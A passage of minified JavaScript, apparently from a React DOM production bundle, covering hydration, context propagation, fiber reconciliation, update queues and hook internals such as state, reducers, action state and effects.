i=l-l%5;s=(n&(1<<i)-1).toString(32),n>>=i,l-=i,Lt=1<<32-rt(t)+l|a<<l|n,Nt=s+e}else Lt=1<<s|a<<l|n,Nt=e}function Pi(e){e.return!==null&&(Kt(e,1),Jr(e,1,0))}function Fi(e){for(;e===ss;)ss=pn[--hn],pn[hn]=null,al=pn[--hn],pn[hn]=null;for(;e===oa;)oa=Tt[--_t],Tt[_t]=null,Nt=Tt[--_t],Tt[_t]=null,Lt=Tt[--_t],Tt[_t]=null}function Pr(e,t){Tt[_t++]=Lt,Tt[_t++]=Nt,Tt[_t++]=oa,Lt=t.id,Nt=t.overflow,oa=e}var Ze=null,Ae=null,fe=!1,ca=null,Rt=!1,eo=Error(r(519));function ra(e){var t=Error(r(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw nl(Et(t,e)),eo}function Fr(e){var t=e.stateNode,a=e.type,n=e.memoizedProps;switch(t[Ie]=e,t[et]=n,a){case"dialog":ce("cancel",t),ce("close",t);break;case"iframe":case"object":case"embed":ce("load",t);break;case"video":case"audio":for(a=0;a<Al.length;a++)ce(Al[a],t);break;case"source":ce("error",t);break;case"img":case"image":case"link":ce("error",t),ce("load",t);break;case"details":ce("toggle",t);break;case"input":ce("invalid",t),fr(t,n.value,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name,!0);break;case"select":ce("invalid",t);break;case"textarea":ce("invalid",t),pr(t,n.value,n.defaultValue,n.children)}a=n.children,typeof a!="string"&&typeof a!="number"&&typeof a!="bigint"||t.textContent===""+a||n.suppressHydrationWarning===!0||yf(t.textContent,a)?(n.popover!=null&&(ce("beforetoggle",t),ce("toggle",t)),n.onScroll!=null&&ce("scroll",t),n.onScrollEnd!=null&&ce("scrollend",t),n.onClick!=null&&(t.onclick=Gt),t=!0):t=!1,t||ra(e,!0)}function eu(e){for(Ze=e.return;Ze;)switch(Ze.tag){case 5:case 31:case 13:Rt=!1;return;case 27:case 3:Rt=!0;return;default:Ze=Ze.return}}function gn(e){if(e!==Ze)return!1;if(!fe)return eu(e),fe=!0,!1;var t=e.tag,a;if((a=t!==3&&t!==27)&&((a=t===5)&&(a=e.type,a=!(a!=="form"&&a!=="button")||Sc(e.type,e.memoizedProps)),a=!a),a&&Ae&&ra(e),eu(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(317));Ae=xf(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(317));Ae=xf(e)}else t===27?(t=Ae,_a(e.type)?(e=Rc,Rc=null,Ae=e):Ae=t):Ae=Ze?xt(e.stateNode.nextSibling):null;return!0}function ja(){Ae=Ze=null,fe=!1}function to(){var e=ca;return e!==null&&(st===null?st=e:st.push.apply(st,e),ca=null),e}function nl(e){ca===null?ca=[e]:ca.push(e)}var ao=p(null),Ha=null,Vt=null;function ua(e,t,a){B(ao,t._currentValue),t._currentValue=a}function Xt(e){e._currentValue=ao.current,S(ao)}function no(e,t,a){for(;e!==null;){var n=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,n!==null&&(n.childLanes|=t)):n!==null&&(n.childLanes&t)!==t&&(n.childLanes|=t),e===a)break;e=e.return}}function lo(e,t,a,n){var l=e.child;for(l!==null&&(l.return=e);l!==null;){var s=l.dependencies;if(s!==null){var i=l.child;s=s.firstContext;e:for(;s!==null;){var c=s;s=l;for(var d=0;d<t.length;d++)if(c.context===t[d]){s.lanes|=a,c=s.alternate,c!==null&&(c.lanes|=a),no(s.return,a,e),n||(i=null);break e}s=c.next}}else if(l.tag===18){if(i=l.return,i===null)throw Error(r(341));i.lanes|=a,s=i.alternate,s!==null&&(s.lanes|=a),no(i,a,e),i=null}else i=l.child;if(i!==null)i.return=l;else for(i=l;i!==null;){if(i===e){i=null;break}if(l=i.sibling,l!==null){l.return=i.return,i=l;break}i=i.return}l=i}}function yn(e,t,a,n){e=null;for(var l=t,s=!1;l!==null;){if(!s){if((l.flags&524288)!==0)s=!0;else if((l.flags&262144)!==0)break}if(l.tag===10){var i=l.alternate;if(i===null)throw Error(r(387));if(i=i.memoizedProps,i!==null){var c=l.type;ut(l.pendingProps.value,i.value)||(e!==null?e.push(c):e=[c])}}else if(l===re.current){if(i=l.alternate,i===null)throw Error(r(387));i.memoizedState.memoizedState!==l.memoizedState.memoizedState&&(e!==null?e.push(kl):e=[kl])}l=l.return}e!==null&&lo(t,e,a,n),t.flags|=262144}function is(e){for(e=e.firstContext;e!==null;){if(!ut(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function Ga(e){Ha=e,Vt=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function $e(e){return tu(Ha,e)}function os(e,t){return Ha===null&&Ga(e),tu(e,t)}function tu(e,t){var a=t._currentValue;if(t={context:t,memoizedValue:a,next:null},Vt===null){if(e===null)throw Error(r(308));Vt=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else Vt=Vt.next=t;return a}var jp=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(a,n){e.push(n)}};this.abort=function(){t.aborted=!0,e.forEach(function(a){return a()})}},Hp=o.unstable_scheduleCallback,Gp=o.unstable_NormalPriority,Ue={$$typeof:P,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function so(){return{controller:new jp,data:new Map,refCount:0}}function ll(e){e.refCount--,e.refCount===0&&Hp(Gp,function(){e.controller.abort()})}var sl=null,io=0,vn=0,Sn=null;function Qp(e,t){if(sl===null){var a=sl=[];io=0,vn=uc(),Sn={status:"pending",value:void 0,then:function(n){a.push(n)}}}return io++,t.then(au,au),t}function au(){if(--io===0&&sl!==null){Sn!==null&&(Sn.status="fulfilled");var e=sl;sl=null,vn=0,Sn=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function Yp(e,t){var a=[],n={status:"pending",value:null,reason:null,then:function(l){a.push(l)}};return e.then(function(){n.status="fulfilled",n.value=t;for(var l=0;l<a.length;l++)(0,a[l])(t)},function(l){for(n.status="rejected",n.reason=l,l=0;l<a.length;l++)(0,a[l])(void 0)}),n}var nu=A.S;A.S=function(e,t){Hd=ot(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&Qp(e,t),nu!==null&&nu(e,t)};var Qa=p(null);function oo(){var e=Qa.current;return e!==null?e:Te.pooledCache}function cs(e,t){t===null?B(Qa,Qa.current):B(Qa,t.pool)}function lu(){var e=oo();return e===null?null:{parent:Ue._currentValue,pool:e}}var bn=Error(r(460)),co=Error(r(474)),rs=Error(r(542)),us={then:function(){}};function su(e){return e=e.status,e==="fulfilled"||e==="rejected"}function iu(e,t,a){switch(a=e[a],a===void 0?e.push(t):a!==t&&(t.then(Gt,Gt),t=a),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,cu(e),e;default:if(typeof t.status=="string")t.then(Gt,Gt);else{if(e=Te,e!==null&&100<e.shellSuspendCounter)throw Error(r(482));e=t,e.status="pending",e.then(function(n){if(t.status==="pending"){var l=t;l.status="fulfilled",l.value=n}},function(n){if(t.status==="pending"){var l=t;l.status="rejected",l.reason=n}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,cu(e),e}throw Ka=t,bn}}function Ya(e){try{var t=e._init;return t(e._payload)}catch(a){throw a!==null&&typeof a=="object"&&typeof a.then=="function"?(Ka=a,bn):a}}var Ka=null;function ou(){if(Ka===null)throw Error(r(459));var e=Ka;return Ka=null,e}function cu(e){if(e===bn||e===rs)throw Error(r(483))}var En=null,il=0;function ds(e){var t=il;return il+=1,En===null&&(En=[]),iu(En,e,t)}function ol(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function fs(e,t){throw t.$$typeof===q?Error(r(525)):(e=Object.prototype.toString.call(t),Error(r(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function ru(e){function t(y,h){if(e){var b=y.deletions;b===null?(y.deletions=[h],y.flags|=16):b.push(h)}}function a(y,h){if(!e)return null;for(;h!==null;)t(y,h),h=h.sibling;return null}function n(y){for(var h=new Map;y!==null;)y.key!==null?h.set(y.key,y):h.set(y.index,y),y=y.sibling;return h}function l(y,h){return y=Yt(y,h),y.index=0,y.sibling=null,y}function s(y,h,b){return y.index=b,e?(b=y.alternate,b!==null?(b=b.index,b<h?(y.flags|=67108866,h):b):(y.flags|=67108866,h)):(y.flags|=1048576,h)}function i(y){return e&&y.alternate===null&&(y.flags|=67108866),y}function c(y,h,b,w){return h===null||h.tag!==6?(h=Wi(b,y.mode,w),h.return=y,h):(h=l(h,b),h.return=y,h)}function d(y,h,b,w){var X=b.type;return X===$?D(y,h,b.props.children,w,b.key):h!==null&&(h.elementType===X||typeof X=="object"&&X!==null&&X.$$typeof===_e&&Ya(X)===h.type)?(h=l(h,b.props),ol(h,b),h.return=y,h):(h=ls(b.type,b.key,b.props,null,y.mode,w),ol(h,b),h.return=y,h)}function E(y,h,b,w){return h===null||h.tag!==4||h.stateNode.containerInfo!==b.containerInfo||h.stateNode.implementation!==b.implementation?(h=Ji(b,y.mode,w),h.return=y,h):(h=l(h,b.children||[]),h.return=y,h)}function D(y,h,b,w,X){return h===null||h.tag!==7?(h=Ba(b,y.mode,w,X),h.return=y,h):(h=l(h,b),h.return=y,h)}function M(y,h,b){if(typeof h=="string"&&h!==""||typeof h=="number"||typeof h=="bigint")return h=Wi(""+h,y.mode,b),h.return=y,h;if(typeof h=="object"&&h!==null){switch(h.$$typeof){case j:return b=ls(h.type,h.key,h.props,null,y.mode,b),ol(b,h),b.return=y,b;case K:return h=Ji(h,y.mode,b),h.return=y,h;case _e:return h=Ya(h),M(y,h,b)}if(qe(h)||Re(h))return h=Ba(h,y.mode,b,null),h.return=y,h;if(typeof h.then=="function")return M(y,ds(h),b);if(h.$$typeof===P)return M(y,os(y,h),b);fs(y,h)}return null}function T(y,h,b,w){var X=h!==null?h.key:null;if(typeof b=="string"&&b!==""||typeof b=="number"||typeof b=="bigint")return X!==null?null:c(y,h,""+b,w);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case j:return b.key===X?d(y,h,b,w):null;case K:return b.key===X?E(y,h,b,w):null;case _e:return b=Ya(b),T(y,h,b,w)}if(qe(b)||Re(b))return X!==null?null:D(y,h,b,w,null);if(typeof b.then=="function")return T(y,h,ds(b),w);if(b.$$typeof===P)return T(y,h,os(y,b),w);fs(y,b)}return null}function _(y,h,b,w,X){if(typeof w=="string"&&w!==""||typeof w=="number"||typeof w=="bigint")return y=y.get(b)||null,c(h,y,""+w,X);if(typeof w=="object"&&w!==null){switch(w.$$typeof){case j:return y=y.get(w.key===null?b:w.key)||null,d(h,y,w,X);case K:return y=y.get(w.key===null?b:w.key)||null,E(h,y,w,X);case _e:return w=Ya(w),_(y,h,b,w,X)}if(qe(w)||Re(w))return y=y.get(b)||null,D(h,y,w,X,null);if(typeof w.then=="function")return _(y,h,b,ds(w),X);if(w.$$typeof===P)return _(y,h,b,os(h,w),X);fs(h,w)}return null}function Q(y,h,b,w){for(var X=null,me=null,Y=h,te=h=0,de=null;Y!==null&&te<b.length;te++){Y.index>te?(de=Y,Y=null):de=Y.sibling;var pe=T(y,Y,b[te],w);if(pe===null){Y===null&&(Y=de);break}e&&Y&&pe.alternate===null&&t(y,Y),h=s(pe,h,te),me===null?X=pe:me.sibling=pe,me=pe,Y=de}if(te===b.length)return a(y,Y),fe&&Kt(y,te),X;if(Y===null){for(;te<b.length;te++)Y=M(y,b[te],w),Y!==null&&(h=s(Y,h,te),me===null?X=Y:me.sibling=Y,me=Y);return fe&&Kt(y,te),X}for(Y=n(Y);te<b.length;te++)de=_(Y,y,te,b[te],w),de!==null&&(e&&de.alternate!==null&&Y.delete(de.key===null?te:de.key),h=s(de,h,te),me===null?X=de:me.sibling=de,me=de);return e&&Y.forEach(function(Oa){return t(y,Oa)}),fe&&Kt(y,te),X}function Z(y,h,b,w){if(b==null)throw Error(r(151));for(var X=null,me=null,Y=h,te=h=0,de=null,pe=b.next();Y!==null&&!pe.done;te++,pe=b.next()){Y.index>te?(de=Y,Y=null):de=Y.sibling;var Oa=T(y,Y,pe.value,w);if(Oa===null){Y===null&&(Y=de);break}e&&Y&&Oa.alternate===null&&t(y,Y),h=s(Oa,h,te),me===null?X=Oa:me.sibling=Oa,me=Oa,Y=de}if(pe.done)return a(y,Y),fe&&Kt(y,te),X;if(Y===null){for(;!pe.done;te++,pe=b.next())pe=M(y,pe.value,w),pe!==null&&(h=s(pe,h,te),me===null?X=pe:me.sibling=pe,me=pe);return fe&&Kt(y,te),X}for(Y=n(Y);!pe.done;te++,pe=b.next())pe=_(Y,y,te,pe.value,w),pe!==null&&(e&&pe.alternate!==null&&Y.delete(pe.key===null?te:pe.key),h=s(pe,h,te),me===null?X=pe:me.sibling=pe,me=pe);return e&&Y.forEach(function(e0){return t(y,e0)}),fe&&Kt(y,te),X}function Ee(y,h,b,w){if(typeof b=="object"&&b!==null&&b.type===$&&b.key===null&&(b=b.props.children),typeof b=="object"&&b!==null){switch(b.$$typeof){case j:e:{for(var X=b.key;h!==null;){if(h.key===X){if(X=b.type,X===$){if(h.tag===7){a(y,h.sibling),w=l(h,b.props.children),w.return=y,y=w;break e}}else if(h.elementType===X||typeof X=="object"&&X!==null&&X.$$typeof===_e&&Ya(X)===h.type){a(y,h.sibling),w=l(h,b.props),ol(w,b),w.return=y,y=w;break e}a(y,h);break}else t(y,h);h=h.sibling}b.type===$?(w=Ba(b.props.children,y.mode,w,b.key),w.return=y,y=w):(w=ls(b.type,b.key,b.props,null,y.mode,w),ol(w,b),w.return=y,y=w)}return i(y);case K:e:{for(X=b.key;h!==null;){if(h.key===X)if(h.tag===4&&h.stateNode.containerInfo===b.containerInfo&&h.stateNode.implementation===b.implementation){a(y,h.sibling),w=l(h,b.children||[]),w.return=y,y=w;break e}else{a(y,h);break}else t(y,h);h=h.sibling}w=Ji(b,y.mode,w),w.return=y,y=w}return i(y);case _e:return b=Ya(b),Ee(y,h,b,w)}if(qe(b))return Q(y,h,b,w);if(Re(b)){if(X=Re(b),typeof X!="function")throw Error(r(150));return b=X.call(b),Z(y,h,b,w)}if(typeof b.then=="function")return Ee(y,h,ds(b),w);if(b.$$typeof===P)return Ee(y,h,os(y,b),w);fs(y,b)}return typeof b=="string"&&b!==""||typeof b=="number"||typeof b=="bigint"?(b=""+b,h!==null&&h.tag===6?(a(y,h.sibling),w=l(h,b),w.return=y,y=w):(a(y,h),w=Wi(b,y.mode,w),w.return=y,y=w),i(y)):a(y,h)}return function(y,h,b,w){try{il=0;var X=Ee(y,h,b,w);return En=null,X}catch(Y){if(Y===bn||Y===rs)throw Y;var me=dt(29,Y,null,y.mode);return me.lanes=w,me.return=y,me}finally{}}}var Va=ru(!0),uu=ru(!1),da=!1;function ro(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function uo(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function fa(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function ma(e,t,a){var n=e.updateQueue;if(n===null)return null;if(n=n.shared,(he&2)!==0){var l=n.pending;return l===null?t.next=t:(t.next=l.next,l.next=t),n.pending=t,t=ns(e),Ir(e,null,a),t}return as(e,n,t,a),ns(e)}function cl(e,t,a){if(t=t.updateQueue,t!==null&&(t=t.shared,(a&4194048)!==0)){var n=t.lanes;n&=e.pendingLanes,a|=n,t.lanes=a,tr(e,a)}}function fo(e,t){var a=e.updateQueue,n=e.alternate;if(n!==null&&(n=n.updateQueue,a===n)){var l=null,s=null;if(a=a.firstBaseUpdate,a!==null){do{var i={lane:a.lane,tag:a.tag,payload:a.payload,callback:null,next:null};s===null?l=s=i:s=s.next=i,a=a.next}while(a!==null);s===null?l=s=t:s=s.next=t}else l=s=t;a={baseState:n.baseState,firstBaseUpdate:l,lastBaseUpdate:s,shared:n.shared,callbacks:n.callbacks},e.updateQueue=a;return}e=a.lastBaseUpdate,e===null?a.firstBaseUpdate=t:e.next=t,a.lastBaseUpdate=t}var mo=!1;function rl(){if(mo){var e=Sn;if(e!==null)throw e}}function ul(e,t,a,n){mo=!1;var l=e.updateQueue;da=!1;var s=l.firstBaseUpdate,i=l.lastBaseUpdate,c=l.shared.pending;if(c!==null){l.shared.pending=null;var d=c,E=d.next;d.next=null,i===null?s=E:i.next=E,i=d;var D=e.alternate;D!==null&&(D=D.updateQueue,c=D.lastBaseUpdate,c!==i&&(c===null?D.firstBaseUpdate=E:c.next=E,D.lastBaseUpdate=d))}if(s!==null){var M=l.baseState;i=0,D=E=d=null,c=s;do{var T=c.lane&-536870913,_=T!==c.lane;if(_?(ue&T)===T:(n&T)===T){T!==0&&T===vn&&(mo=!0),D!==null&&(D=D.next={lane:0,tag:c.tag,payload:c.payload,callback:null,next:null});e:{var Q=e,Z=c;T=t;var Ee=a;switch(Z.tag){case 1:if(Q=Z.payload,typeof Q=="function"){M=Q.call(Ee,M,T);break e}M=Q;break e;case 3:Q.flags=Q.flags&-65537|128;case 0:if(Q=Z.payload,T=typeof Q=="function"?Q.call(Ee,M,T):Q,T==null)break e;M=O({},M,T);break e;case 2:da=!0}}T=c.callback,T!==null&&(e.flags|=64,_&&(e.flags|=8192),_=l.callbacks,_===null?l.callbacks=[T]:_.push(T))}else _={lane:T,tag:c.tag,payload:c.payload,callback:c.callback,next:null},D===null?(E=D=_,d=M):D=D.next=_,i|=T;if(c=c.next,c===null){if(c=l.shared.pending,c===null)break;_=c,c=_.next,_.next=null,l.lastBaseUpdate=_,l.shared.pending=null}}while(!0);D===null&&(d=M),l.baseState=d,l.firstBaseUpdate=E,l.lastBaseUpdate=D,s===null&&(l.shared.lanes=0),va|=i,e.lanes=i,e.memoizedState=M}}function du(e,t){if(typeof e!="function")throw Error(r(191,e));e.call(t)}function fu(e,t){var a=e.callbacks;if(a!==null)for(e.callbacks=null,e=0;e<a.length;e++)du(a[e],t)}var Tn=p(null),ms=p(0);function mu(e,t){e=ta,B(ms,e),B(Tn,t),ta=e|t.baseLanes}function po(){B(ms,ta),B(Tn,Tn.current)}function ho(){ta=ms.current,S(Tn),S(ms)}var ft=p(null),At=null;function pa(e){var t=e.alternate;B(Me,Me.current&1),B(ft,e),At===null&&(t===null||Tn.current!==null||t.memoizedState!==null)&&(At=e)}function go(e){B(Me,Me.current),B(ft,e),At===null&&(At=e)}function pu(e){e.tag===22?(B(Me,Me.current),B(ft,e),At===null&&(At=e)):ha()}function ha(){B(Me,Me.current),B(ft,ft.current)}function mt(e){S(ft),At===e&&(At=null),S(Me)}var Me=p(0);function ps(e){for(var t=e;t!==null;){if(t.tag===13){var a=t.memoizedState;if(a!==null&&(a=a.dehydrated,a===null||Tc(a)||_c(a)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var It=0,ee=null,Se=null,ze=null,hs=!1,_n=!1,Xa=!1,gs=0,dl=0,Rn=null,Kp=0;function ke(){throw Error(r(321))}function yo(e,t){if(t===null)return!1;for(var a=0;a<t.length&&a<e.length;a++)if(!ut(e[a],t[a]))return!1;return!0}function vo(e,t,a,n,l,s){return It=s,ee=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,A.H=e===null||e.memoizedState===null?Ju:Lo,Xa=!1,s=a(n,l),Xa=!1,_n&&(s=gu(t,a,n,l)),hu(e),s}function hu(e){A.H=pl;var t=Se!==null&&Se.next!==null;if(It=0,ze=Se=ee=null,hs=!1,dl=0,Rn=null,t)throw Error(r(300));e===null||Be||(e=e.dependencies,e!==null&&is(e)&&(Be=!0))}function gu(e,t,a,n){ee=e;var l=0;do{if(_n&&(Rn=null),dl=0,_n=!1,25<=l)throw Error(r(301));if(l+=1,ze=Se=null,e.updateQueue!=null){var s=e.updateQueue;s.lastEffect=null,s.events=null,s.stores=null,s.memoCache!=null&&(s.memoCache.index=0)}A.H=Pu,s=t(a,n)}while(_n);return s}function Vp(){var e=A.H,t=e.useState()[0];return t=typeof t.then=="function"?fl(t):t,e=e.useState()[0],(Se!==null?Se.memoizedState:null)!==e&&(ee.flags|=1024),t}function So(){var e=gs!==0;return gs=0,e}function bo(e,t,a){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a}function Eo(e){if(hs){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}hs=!1}It=0,ze=Se=ee=null,_n=!1,dl=gs=0,Rn=null}function Fe(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return ze===null?ee.memoizedState=ze=e:ze=ze.next=e,ze}function Le(){if(Se===null){var e=ee.alternate;e=e!==null?e.memoizedState:null}else e=Se.next;var t=ze===null?ee.memoizedState:ze.next;if(t!==null)ze=t,Se=e;else{if(e===null)throw ee.alternate===null?Error(r(467)):Error(r(310));Se=e,e={memoizedState:Se.memoizedState,baseState:Se.baseState,baseQueue:Se.baseQueue,queue:Se.queue,next:null},ze===null?ee.memoizedState=ze=e:ze=ze.next=e}return ze}function ys(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function fl(e){var t=dl;return dl+=1,Rn===null&&(Rn=[]),e=iu(Rn,e,t),t=ee,(ze===null?t.memoizedState:ze.next)===null&&(t=t.alternate,A.H=t===null||t.memoizedState===null?Ju:Lo),e}function vs(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return fl(e);if(e.$$typeof===P)return $e(e)}throw Error(r(438,String(e)))}function To(e){var t=null,a=ee.updateQueue;if(a!==null&&(t=a.memoCache),t==null){var n=ee.alternate;n!==null&&(n=n.updateQueue,n!==null&&(n=n.memoCache,n!=null&&(t={data:n.data.map(function(l){return l.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),a===null&&(a=ys(),ee.updateQueue=a),a.memoCache=t,a=t.data[t.index],a===void 0)for(a=t.data[t.index]=Array(e),n=0;n<e;n++)a[n]=He;return t.index++,a}function Zt(e,t){return typeof t=="function"?t(e):t}function Ss(e){var t=Le();return _o(t,Se,e)}function _o(e,t,a){var n=e.queue;if(n===null)throw Error(r(311));n.lastRenderedReducer=a;var l=e.baseQueue,s=n.pending;if(s!==null){if(l!==null){var i=l.next;l.next=s.next,s.next=i}t.baseQueue=l=s,n.pending=null}if(s=e.baseState,l===null)e.memoizedState=s;else{t=l.next;var c=i=null,d=null,E=t,D=!1;do{var M=E.lane&-536870913;if(M!==E.lane?(ue&M)===M:(It&M)===M){var T=E.revertLane;if(T===0)d!==null&&(d=d.next={lane:0,revertLane:0,gesture:null,action:E.action,hasEagerState:E.hasEagerState,eagerState:E.eagerState,next:null}),M===vn&&(D=!0);else if((It&T)===T){E=E.next,T===vn&&(D=!0);continue}else M={lane:0,revertLane:E.revertLane,gesture:null,action:E.action,hasEagerState:E.hasEagerState,eagerState:E.eagerState,next:null},d===null?(c=d=M,i=s):d=d.next=M,ee.lanes|=T,va|=T;M=E.action,Xa&&a(s,M),s=E.hasEagerState?E.eagerState:a(s,M)}else T={lane:M,revertLane:E.revertLane,gesture:E.gesture,action:E.action,hasEagerState:E.hasEagerState,eagerState:E.eagerState,next:null},d===null?(c=d=T,i=s):d=d.next=T,ee.lanes|=M,va|=M;E=E.next}while(E!==null&&E!==t);if(d===null?i=s:d.next=c,!ut(s,e.memoizedState)&&(Be=!0,D&&(a=Sn,a!==null)))throw a;e.memoizedState=s,e.baseState=i,e.baseQueue=d,n.lastRenderedState=s}return l===null&&(n.lanes=0),[e.memoizedState,n.dispatch]}function Ro(e){var t=Le(),a=t.queue;if(a===null)throw Error(r(311));a.lastRenderedReducer=e;var n=a.dispatch,l=a.pending,s=t.memoizedState;if(l!==null){a.pending=null;var i=l=l.next;do s=e(s,i.action),i=i.next;while(i!==l);ut(s,t.memoizedState)||(Be=!0),t.memoizedState=s,t.baseQueue===null&&(t.baseState=s),a.lastRenderedState=s}return[s,n]}function yu(e,t,a){var n=ee,l=Le(),s=fe;if(s){if(a===void 0)throw Error(r(407));a=a()}else a=t();var i=!ut((Se||l).memoizedState,a);if(i&&(l.memoizedState=a,Be=!0),l=l.queue,Co(bu.bind(null,n,l,e),[e]),l.getSnapshot!==t||i||ze!==null&&ze.memoizedState.tag&1){if(n.flags|=2048,An(9,{destroy:void 0},Su.bind(null,n,l,a,t),null),Te===null)throw Error(r(349));s||(It&127)!==0||vu(n,t,a)}return a}function vu(e,t,a){e.flags|=16384,e={getSnapshot:t,value:a},t=ee.updateQueue,t===null?(t=ys(),ee.updateQueue=t,t.stores=[e]):(a=t.stores,a===null?t.stores=[e]:a.push(e))}function Su(e,t,a,n){t.value=a,t.getSnapshot=n,Eu(t)&&Tu(e)}function bu(e,t,a){return a(function(){Eu(t)&&Tu(e)})}function Eu(e){var t=e.getSnapshot;e=e.value;try{var a=t();return!ut(e,a)}catch{return!0}}function Tu(e){var t=za(e,2);t!==null&&it(t,e,2)}function Ao(e){var t=Fe();if(typeof e=="function"){var a=e;if(e=a(),Xa){la(!0);try{a()}finally{la(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Zt,lastRenderedState:e},t}function _u(e,t,a,n){return e.baseState=a,_o(e,Se,typeof n=="function"?n:Zt)}function Xp(e,t,a,n,l){if(Ts(e))throw Error(r(485));if(e=t.action,e!==null){var s={payload:l,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(i){s.listeners.push(i)}};A.T!==null?a(!0):s.isTransition=!1,n(s),a=t.pending,a===null?(s.next=t.pending=s,Ru(t,s)):(s.next=a.next,t.pending=a.next=s)}}function Ru(e,t){var a=t.action,n=t.payload,l=e.state;if(t.isTransition){var s=A.T,i={};A.T=i;try{var c=a(l,n),d=A.S;d!==null&&d(i,c),Au(e,t,c)}catch(E){xo(e,t,E)}finally{s!==null&&i.types!==null&&(s.types=i.types),A.T=s}}else try{s=a(l,n),Au(e,t,s)}catch(E){xo(e,t,E)}}function Au(e,t,a){a!==null&&typeof a=="object"&&typeof a.then=="function"?a.then(function(n){xu(e,t,n)},function(n){return xo(e,t,n)}):xu(e,t,a)}function xu(e,t,a){t.status="fulfilled",t.value=a,Cu(t),e.state=a,t=e.pending,t!==null&&(a=t.next,a===t?e.pending=null:(a=a.next,t.next=a,Ru(e,a)))}function xo(e,t,a){var n=e.pending;if(e.pending=null,n!==null){n=n.next;do t.status="rejected",t.reason=a,Cu(t),t=t.next;while(t!==n)}e.action=null}function Cu(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function Ou(e,t){return t}function Du(e,t){if(fe){var a=Te.formState;if(a!==null){e:{var n=ee;if(fe){if(Ae){t:{for(var l=Ae,s=Rt;l.nodeType!==8;){if(!s){l=null;break t}if(l=xt(l.nextSibling),l===null){l=null;break t}}s=l.data,l=s==="F!"||s==="F"?l:null}if(l){Ae=xt(l.nextSibling),n=l.data==="F!";break e}}ra(n)}n=!1}n&&(t=a[0])}}return a=Fe(),a.memoizedState=a.baseState=t,n={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ou,lastRenderedState:t},a.queue=n,a=Zu.bind(null,ee,n),n.dispatch=a,n=Ao(!1),s=Mo.bind(null,ee,!1,n.queue),n=Fe(),l={state:t,dispatch:null,action:e,pending:null},n.queue=l,a=Xp.bind(null,ee,l,s,a),l.dispatch=a,n.memoizedState=e,[t,a,!1]}function ku(e){var t=Le();return wu(t,Se,e)}function wu(e,t,a){if(t=_o(e,t,Ou)[0],e=Ss(Zt)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var n=fl(t)}catch(i){throw i===bn?rs:i}else n=t;t=Le();var l=t.queue,s=l.dispatch;return a!==t.memoizedState&&(ee.flags|=2048,An(9,{destroy:void 0},Ip.bind(null,l,a),null)),[n,s,e]}function Ip(e,t){e.action=t}function Mu(e){var t=Le(),a=Se;if(a!==null)return wu(t,a,e);Le(),t=t.memoizedState,a=Le();var n=a.queue.dispatch;return a.memoizedState=e,[t,n,!1]}function An(e,t,a,n){return e={tag:e,create:a,deps:n,inst:t,next:null},t=ee.updateQueue,t===null&&(t=ys(),ee.updateQueue=t),a=t.lastEffect,a===null?t.lastEffect=e.next=e:(n=a.next,a.next=e,e.next=n,t.lastEffect=e),e}function Lu(){return Le().memoizedState}function bs(e,t,a,n){var l=Fe();ee.flags|=e,l.memoizedState=An(1|t,{destroy:void 0},a,n===void 0?null:n)}function Es(e,t,a,n){var l=Le();n=n===void 0?null:n;var s=l.memoizedState.inst;Se!==null&&n!==null&&yo(n,Se.memoizedState.deps)?l.memoizedState=An(t,s,a,n):(ee.flags|=e,l.memoizedState=An(1|t,s,a,n))}function Nu(e,t){bs(8390656,8,e,t)}function Co(e,t){Es(2048,8,e,t)}function Zp(e){ee.flags|=4;var t=ee.updateQueue;if(t===null)t=ys(),ee.updateQueue=t,t.events=[e];else{var a=t.events;a===null?t.events=[e]:a.push(e)}}function qu(e){var t=Le().memoizedState;return Zp({ref:t,nextImpl:e}),function(){if((he&2)!==0)throw Error(r(440));return t.impl.apply(void 0,arguments)}}function Uu(e,t){return Es(4,2,e,t)}function zu(e,t){return Es(4,4,e,t)}function Bu(e,t){if(typeof 